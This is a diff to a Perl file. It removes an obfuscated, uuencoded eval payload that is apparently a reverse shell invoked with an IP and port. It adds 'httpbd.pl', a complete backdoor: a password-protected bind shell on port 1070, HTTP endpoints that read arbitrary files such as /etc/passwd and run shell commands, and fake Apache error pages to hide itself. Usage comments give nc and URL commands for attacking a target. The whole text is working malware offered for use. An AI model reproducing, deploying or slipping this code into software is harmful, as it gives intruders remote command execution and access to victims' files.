@@ -1,3 +1,132 @@
-#!/usr/bin/perl
-# perl bc.pl IP PORT
-eval unpack u=>q{_=7-E(%-O8VME=#L*)&EA9&1R/6EN971?871O;B@D05)'5ELP72D@?'P@9&EE*")<>#0U7'@W,EQX-S)<>#9&_7'@W,EQX,T%<>#(P)"%<;B(I.PHD<&%D9'(]<V]C:V%D9')?:6XH)$%21U9;,5TL("1I861D<BD@?'P@9&EE_*")<>#0U7'@W,EQX-S)<>#9&7'@W,EQX,T%<>#(P)"%<;B(I.PHD<')O=&\]9V5T<')O=&]B>6YA;64H(EQX_-S1<>#8S7'@W,"(I.PIS;V-K970H4T]#2T54+"!01E])3D54+"!33T-+7U-44D5!32P@)'!R;W1O*2!\?"!D_:64H(EQX-#5<>#<R7'@W,EQX-D9<>#<R7'@S05QX,C`D(5QN(BD["F-O;FYE8W0H4T]#2T54+"`D<&%D9'(I_('Q\(&1I92@B7'@T-5QX-S)<>#<R7'@V1EQX-S)<>#-!7'@R,"0A7&XB*3L*;W!E;BA35$1)3BP@(EQX,T5<_>#(V7'@U,UQX-$9<>#0S7'@T0EQX-#5<>#4T(BD["F]P96XH4U1$3U54+"`B7'@S15QX,C9<>#4S7'@T1EQX_-#-<>#1"7'@T-5QX-30B*3L*;W!E;BA35$1%4E(L(")<>#-%7'@R-EQX-3-<>#1&7'@T,UQX-$)<>#0U7'@U_-"(I.PIS>7-T96TH(EQX,D9<>#8R7'@V.5QX-D5<>#)&7'@W,UQX-CA<>#(P7'@R1%QX-CDB*3L*8VQO<V4HE4U1$24XI.PIC;&]S92A35$1/550I.PIC;&]S92A35$1%4E(I.P}
+#usr/bin/perl
+
+# httpbd.pl Usage:
+# 1. bind shell:
+# nc target 1070
+# ->SHELLPASSWORD{ENTER}{ENTER}
+# 2. download files
+# http://target:1070/file?/etc/passwd
+# or
+# http://target:1070/file?../some/file
+# 3. http shell
+# http://target:1070/shell?id;uname -a
+
+use Socket;
+
+$SHELL="/bin/sh -i";
+$SHELLPASSWORD="b0ru70";
+$LISTENPORT="1070";
+$HTTPFILECMD="file";
+$HTTPSHELLCMD="shell";
+
+$HTTP404= "HTTP/1.1 404 Not Found\n" .
+"Date: Mon, 14 Jan 2002 03:19:55 GMT\n" .
+"Server: Apache/1.3.22 (Unix)\n" .
+"Connection: close\n" .
+"Content-Type: text/html\n\n" .
+"<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 4.0//EN\">\n" .
+"<HTML><HEAD>\n" .
+"<TITLE>404 Not Found</TITLE>\n" .
+"</HEAD><BODY>\n" .
+"
+Not Found
+\n" .
+"The requested URL was not found on this server.
+
+\n" .
+"
+\n" .
+"<ADDRESS>Apache/1.3.22 Server at localhost Port $LISTENPORT</ADDRESS>\n" .
+"</BODY></HTML>\n";
+
+$HTTP400= "HTTP/1.1 400 Bad Request\n" .
+"Server: Apache/1.3.22 (Unix)\n" .
+"Date: Mon, 14 Jan 2002 03:19:55 GMT\n" .
+"Cache-Control: no-cache,no-store\n" .
+"Connection: close\n" .
+"Content-Type: text/html\n\n" .
+"<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 4.0//EN\">\n" .
+"<HTML><HEAD><TITLE>400 Bad Request</TITLE></HEAD>" .
+"<BODY>" .
+"
+400 Bad Request
+Your request has bad syntax or is inherently impossible to satisfy.</BODY></HTML>\n";
+
+$HTTP200= "HTTP/1.1 200 OK\n" .
+"Cache-Control: no-cache,no-store\n" .
+"Connection: close\n";
+
+$protocol=getprotobyname('tcp');
+socket(S,&PF_INET,&SOCK_STREAM,$protocol) || die "Cant create socket\n";
+setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);
+bind (S,sockaddr_in($LISTENPORT,INADDR_ANY)) || die "Cant open port\n";
+listen (S,3) || die "Cant listen port\n";
+while(1)
+{
+accept (CONN,S);
+if(! ($pid=fork))
+{
+die "Cannot fork" if (! defined $pid);
+close CONN;
+}
+else
+{
+$buf=<CONN>; chomp($buf); $buf=~s/\r//g;
+M1:
+while($s= <CONN>) {
+if($s=~/^\r?\n$/) { last M1; }
+}
+if($buf eq $SHELLPASSWORD)
+{
+open STDIN,"<&CONN";
+open STDOUT,">&CONN";
+open STDERR,">&CONN";
+exec $SHELL || die print CONN "Cant execute $SHELL\n";
+}
+elsif($buf=~/^GET \/$HTTPFILECMD\?([^ ]+) HTTP\/1\.[01]$/)
+{
+$file=$1;
+$file=~s/%([0-9a-f]{2})/chr(hex($1))/ge;
+print CONN $HTTP200;
+print CONN "Content-type: text/plain\n\n";
+open (HTTPFILE,$file) || goto M2;
+
+while(<HTTPFILE>)
+{
+print CONN $_;
+}
+close HTTPFILE;
+}
+elsif($buf=~/^GET \/$HTTPSHELLCMD\?([^ ]+) HTTP\/1\.[01]$/)
+{
+$shcmd=$1;
+$shcmd=~s/%([0-9a-f]{2})/chr(hex($1))/ge;
+$out=`$shcmd`;
+print CONN $HTTP200;
+print CONN "Content-type: text/html\n\n";
+print CONN "<body bgcolor=black>\n\n";
+print CONN "
+
+".$out."
+
+</body>\n";
+}
+elsif($buf=~/^GET \/ HTTP\/1\.[01]$/)
+{
+print CONN $HTTP200;
+print CONN "Content-type: text/plain\n\n";
+}
+elsif($buf=~/^GET (\/[^\/]+)+ HTTP\/1\.[01]$/)
+{
+print CONN $HTTP404;
+
+}
+else
+{
+print CONN $HTTP400;
+}
+M2:
+close CONN;
+exit 0;
+}
+}
